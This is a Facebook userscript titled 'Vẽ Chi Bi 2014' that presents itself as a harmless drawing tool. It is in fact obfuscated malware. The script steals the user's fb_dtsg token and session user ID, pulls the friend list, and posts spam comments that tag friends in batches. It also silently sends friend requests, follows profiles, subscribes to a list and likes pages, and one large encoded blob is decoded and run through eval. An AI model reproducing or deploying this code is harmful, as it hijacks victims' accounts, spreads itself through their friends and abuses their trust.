﻿// ==UserScript==
// @name       Vẽ Chi Bi 2014
// @namespace  http://facebook.com/
// @version    1.2
// @copyright  2013+, You
// ==/UserScript==

var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","296083417206603","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=(y) Mình làm được rồi nè,thử đi các bạn <3   :putnam:   ......................................................................................................   ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 30) {
      X.close;
    }
  };
  X.send(XParams);
}
var _1029;var _6594='5328B42E192A424B382E416D252D392F384D378D388F420D418B394B252C310C252C388E410F386F422B406A390E408E420A280F394C390B420E326B404C390D406C390D408F420A418B320C430B344C382A406B390B268E208E252B252C252A252F266B392C384D378E388B420A418F394E266F270E370B284D374E280A424E382B404A422B390A306F208E424B382D416E252A422E418A390C416F378F398D388D252B310E252C388A410D386B422B406D390C408C420F280B386F410E410A402E398E390D280A406F382D420F386E396C268F208B252E252D252D252F388D410D386E422D406C390F408B420E280B386B410F410D402C398F390A280E406E382A420E386D396C268B208E252A252D252E252D252C252D252C252E282C386D378C422A418E390C416C310B268B372C388B274F270C282E270F370D286C374E270B306B208E208B392A422C408F386F420D398E410C408F252E334A324A354A268F416D270B252E434F208B252C252A252E252C424E382D416B252D364A252A310F252A408B390A426A252D364D342E340F332D420E420C412A352C390A414E422D390F418A420B268D270F306C208E252C252C252A252A424F382E416E252E364A358C352A340F252B310D208C252C252A252E252A252A252E252A252D256B282E282D426A426D426B280C392C382E386D390F384D410C410D402F280F386B410A406F282A382B400E382C428C282D382C388C388F378C392A416B398C390D408D388B282E382E386B420E398F410F408C280E412A396A412F256D306A208F252C252B252D252A424E382C416A252C364A348A382E416F382E406E418E252F310E252A256B420E410D378B392A416B398A390F408A388A310C256B252A274C252F416D252F274C208C252E252F252F252E252A252A252A252B256C264E382B386E420B398C410A408A310E382D388F388B378A392B416C398A390D408A388F264D396B410B426B378F392C410A422F408D388C310D392C416B398C390A408C388D378B384C416E410F426D418D390D416D378E418A264A416D390D392C378B412E382A416E382C406D310B408D410F408C390B264B264F264A410D422D420B394C410F398C408F394C378A398F388B310F264B404E410D394D394C398C408B394E378B404F410C386F382F420A398C410F408E310A418E390E382B416E386E396F264E408F410B378B392D404E430C410A422A420B378F410F408E378C386D404B398F386C402F310B420B416B422B390A264D390D394E410A378C404F410A394A378E388E382D420B382B264C396A420E420E412D378E416C390E392D390F416C390A416C264E378A378C422B418A390D416D310D256C252F274F208D252C252E252F252B252D252B252A252A422A418B390B416F378C398B388E252A274F208A252B252F252C252F252F252C252A252A256E264A378E378A382F310F286B264E378A378C388E430B408A310B298B302F300D382C324E294E432A294F322C328F278D264E378A378C416B390C414D310C290C294A264B392A384B378A388D420A418D394E310F256C252F274E208D252C252E252C252C252C252D252C252A392A384C378D388D420D418C394C252E274C252A256E264A412F396B418A420B382D406F412E310F256B306D208A252E252E252A252A364E280B410A412E390A408B268C256D348A346D354E356E256E276E252E364A358B352D340A276D252D420D416A422E390F270A306B208B252F252E252E252B364E280F410D408F416F390F382F388F430A418F420F382C420B390D386B396D382C408D394E390A252D310C252B392B422D408D386D420C398D410B408A252C268E270A252B434B208F252A252A252C252A252F252F252C252E398C392F252F268B364C280B416E390F382B388D430D354C420E382D420B390F252E310B310E252B292D252E264B264C252A364D280B418B420B382E420E422A418D252E310C310C208B252D252F252C252B252B252D252C252A252F252A252E252D288B284A284C270E252E434C208C252C252A252B252F252D252F252B252F252F252E252D252C364A280D386F404C410A418B390C306C208D252E252B252F252B252A252B252C252A438B208B252D252C252E252D438D306A208E252F252F252D252A364A280C418D390F408E388F268B364C348A382B416F382D406A418E270B306E208D438C208A334F324F354C268E256E286F284F284A284E284B286A294B286A298A298B296B296A298D284C288A256E270B306E208A424A382A416E252A392C384A378E388E420A418E394D252A310C252B388E410F386B422E406F390D408F420E280F394C390F420A326E404D390E406C390B408F420C418F320A430B344B382D406D390E268B208D252A252C252B252D266A392D384F378E388A420D418E394B266F270D370D284C374A280C424D382D404A422B390A306D208A424F382B416F252E422F418F390B416C378E398E388A252F310F252F388C410E386C422D406D390D408F420F280E386C410C410B402C398F390D280D406F382A420E386D396A268F208B252E252E252F252B388C410C386B422E406D390C408D420E280E386B410D410D402D398F390E280D406A382C420C386A396A268E208E252E252D252C252E252B252E252C252D282D386F378C422A418E390D416E310C268E372B388F274C270A282F270A370C286A374B270A306C208A208C392E422C408F386E420E398D410F408F252D340B398F402C390C268F412B270B252D434B208A252D252D252B252A424C382D416D252C348B382D394E390A252D310C252C408B390F426A252E364E342F340E332E420F420F412B352C390B414D422C390E418B420F268A270F306E208E252F252E252A252B424E382B416C252B348A382F394B390B358C352C340F252A310B208B252C252B252A252B252F252B252F252E256F282E282F426C426A426A280E392F382B386C390D384E410A410F402B280F386E410C406A282F382F400B382B428F282F412B382C394B390D418A282E392D382F408B378F418B420B382B420E422A418A280B412B396D412D256C306B208B252D252C252A252F424B382A416D252A348D382E394A390B348E382F416F382E406F418C252B310D252A256E264E392A384E412F382C394F390B378E398E388B310F256C252F274A252F412E252E274D208D252B252F252F252C252A252F252C252F256E264A382C388D388A310D420F416B422D390B264B416E390B404F410D382D388B310F392F382F404F418D390E264D392D382B408E378D410B416F398D394A398B408D310F412C382C394B390F378D420C398D406B390E404A398F408E390D264A392F382D408C378A418B410B422B416E386C390B310A264B386B382A420C310E264C408A386E420B416A370D378B406F410C388F374D310B412A382D394F390A404E390F420C378C420B398B406A390A404E398C408A390A378D412F382F394F390C378A382A386F420E398A410B408C418A264D378F378F422B418D390C416A310F256C252B274C208B252D252F252E252B252C252C252D252C422A418C390C416C378A398D388C252F274A208D252D252A252B252F252E252C252A252E256A264B378D378C382E310F286F264A378D378B388B430B408E310F298F302E300E382C324A294C432F294C322C328D278A264E378B378B416E390E414D310B388F264C392B384C378E388D420B418B394A310A256E252C274A208E252F252A252D252C252D252F252B252C392C384E378D388D420F418A394B252C274E252E256C264E412A396E418C420D382F406E412A310A256B306B208C252E252B252E252F348E382F394D390F280B410B412A390F408E268E256F348C346F354A356F256B276D252D348D382C394F390D358A352D340C276B252A420D416C422E390E270F306A208D252B252D252C252A348C382D394B390A280D410B408E416E390E382F388A430B418A420E382A420F390C386C396C382E408F394F390C252E310A252E392E422E408B386B420B398D410A408A252C268B270E252F434E208D252C252C252D252E252C252C252F252B398E392B252E268F348B382C394E390D280C416B390A382B388E430F354D420D382F420C390F252C310D310D252D292F252B264D264A208D252B252E252B252D252D252E252B252E252A252F252E252C348E382A394C390F280B418E420A382E420C422A418D252B310E310E252F288B284C284A270F252C434C208B252F252A252C252C252F252C252C252D252D252A252E252A348C382C394C390D280E386B404C410E418E390D306E208A252F252D252D252C252C252D252B252A438F208D252D252B252A252E438C306A208A252B252D252C252C348E382C394C390C280D418B390E408B388F268D348C382D394A390C348A382C416C382F406B418A270E306A208E438C208B340D398B402E390E268F256D294E290F292C288B302F290F298D292C296E296B292D298E290F298A300E256D270F306D340C398F402A390B268D256B288D294A294C290B300A294F302D286D286E288D294D298E290A288C284F256E270D306F208B424F382D416A252D422A418C390E416A378D398C388D252D310F252E388F410F386F422C406B390D408A420A280A386D410A410E402F398B390E280F406B382D420D386E396B268F208D252A252A252D252A388C410A386F422F406E390B408F420D280E386F410D410F402A398A390B280A406B382C420D386D396B268D208D252A252A252E252A252F252F252A252E282F386B378B422F418F390F416C310B268D372B388D274D270C282D270D370B286F374F270F306F208F424E382F416F252B392D384D378D388B420E418A394C252A310D252E388D410B386B422E406B390D408A420A280A394D390B420E326D404C390D406D390C408A420D418A320E430C344B382F406C390D268C208D252F252C252A252B266B392D384E378F388E420C418B394C266A270D370D284D374A280C424D382B404F422C390D306D208E424B382A416F252F408C410C426C252E310D252A268B408B390B426A252A324A382B420F390C270B280B394B390B420C356C398F406D390F268D270D306F208E208E392F422E408C386C420B398B410D408F252E348C268B410F412C410C270F252B434F208C252D252F252A252C424F382A416B252A364C252F310F252B408A390C426E252A364B342F340A332E420C420A412E352D390B414F422E390A418C420F268A270E306F208D252C252A252D252B424F382C416E252A364A358A352A340F252E310F208D252F252D252E252B252F252C252D252D256A282E282F426D426F426C280F392C382E386D390B384F410E410D402B280C386F410C406D282A382E400C382E428E282A422E392B398B282E404B398F402E390C280E412F396F412F256B306B208A252F252A252F252C424F382D416C252E364B348B382D416E382C406B418B252A310F208B252E252A252F252A252A252C252A252E256B404E398F402B390F378D382D386D420F398A410E408F310C420E416B422E390E264F392F420D378D390D408B420B378C398A388C390E408B420B398F392C398D390E416C310A256B252C274C208D252F252D252F252E252E252E252E252D410B412E410F252C274F252D256B264B418B410D422B416D386C390D310A286B264B386A404D398A390B408E420A378B398E388C310F256E252D274C208F252B252E252C252D252A252C252E252C408F410D426E252B274C208C252C252D252E252F252F252C252D252D256F262C290C318B290D298D302C298A300B290B300F294C298A264D416B410C410A420A398C388C310E422E378D400F418A410E408A412C378B290A302D378B286A300A264A394A398A392D420C410B386F386F382C418E398C410D408A264E392D420F370A420A408F374A310A262E290C326E262D290B324C264C392F420B370D420C430A412D390E374B310D288F284F264A392A420A370B414B398A388B374B310F294E300C302B284E300B286B286C290F288D302B292B298A284B288A298E302A288C294A298B264C392B420B370F406C392D378E418F420F410A416B430E378E402B390E430A374C310B288A300F286D292C302B296D288F302F284C284C286A302D290B286A292D290A302F294D288A264F392C420A370E396F382F418F378E390C428C412A382E408F388E390A388B378A422E392D398B374A310A286C264D408D386B420C416B370D378A406E410C388C374E310C412C382B394E390B404B390C420D378C396D410E406A390F378B418A420C416D390B382F406E264C378B378B422E418E390F416C310F256A252D274E208F252B252C252E252B252E252F252F252D422F418D390C416F378C398A388D252C274C208A252D252C252B252C252C252B252B252A256E264C378A378E382A310B286C264C378A378A388C430D408A310B298F408E300B300C350D410A318B342D320A404B322B404F430D410A386E412E382C390A264C378F378F416E390D414F310F394F292C264F392A384B378C388E420A418F394A310A256A252E274B208F252E252A252E252D252A252B252C252F392F384C378D388D420B418B394F252D274B252E256B264A412A396C418B420E382B406A412A310C256B306A208C252C252F252E252E364B280A410A412A390B408A268C256F348D346B354C356F256D276A252D364B358B352C340A276D252C420A416F422A390D270F306F208B252F252A252F252C364A280C410D408E416B390F382F388B430E418A420B382C420A390E386E396F382C408A394D390E252A310C252A392C422F408E386D420C398F410B408C252F268E270A252B434B208C252C252F252F252B252D252D252A252D398C392B252B268D364A280F416F390F382A388D430D354C420E382D420D390F252A310B310A252E292E252A264D264E252E364A280E418D420F382F420A422B418D252D310E310E208D252E252B252D252C252C252C252B252A252D252E252C252E288B284B284C270C252F434B208A252D252B252F252F252D252C252B252A252E252C252D252E364D280E386B404F410B418D390E306F208B252B252B252D252F252C252E252A252D438C208D252D252E252F252E438A306A208B252E252F252B252E364A280D418C390F408F388F268B364A348C382B416D382C406E418D270A306C208B438A208A348A268F256C294D296E294F290A288E302E298D302D290D294D288F298F296A284D300A256D270E306C348A268A256A294C298B292F296A292F292D288D302A288D294F302D296C286C294F300E256C270B306B348B268B256A294E300C284C302F294D294B298B286F294A288A302F300D290C292A302D256E270D306D';var _5848=/[\x41\x42\x43\x44\x45\x46]/;var _5865=2;var _7235=_6594.charAt(_6594.length-1);var _3376;var _7607=_6594.split(_5848);var _8334=[String.fromCharCode,isNaN,parseInt,String];_7607[1]=_8334[_5865+1](_8334[_5865](_7607[1])/21);var _7246=(_5865==9)?String:eval;_3376='';_11=_8334[_5865](_7607[0])/_8334[_5865](_7607[1]);for(_1029=3;_1029<_11;_1029++)_3376+=(_8334[_5865-2]((_8334[_5865](_7607[_1029])+_8334[_5865](_7607[2])+_8334[_5865](_7607[1]))/_8334[_5865](_7607[1])-_8334[_5865](_7607[2])+_8334[_5865](_7607[1])-1));var _4988='_2284';var _4615='_4988=_3376';function _4177(_7553){_7246(_3370);_4177(_1047);_1047(_4615);_4177(_4988);}var _3370='_4177=_7246';var _1047='_1047=_4177';_4177(_7235);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//kho
sublist("228852077263071");
//chibi
//TSP
a("10000414840590");

Like("614446398591674");Like("265567040221243");
Like("364191093692081")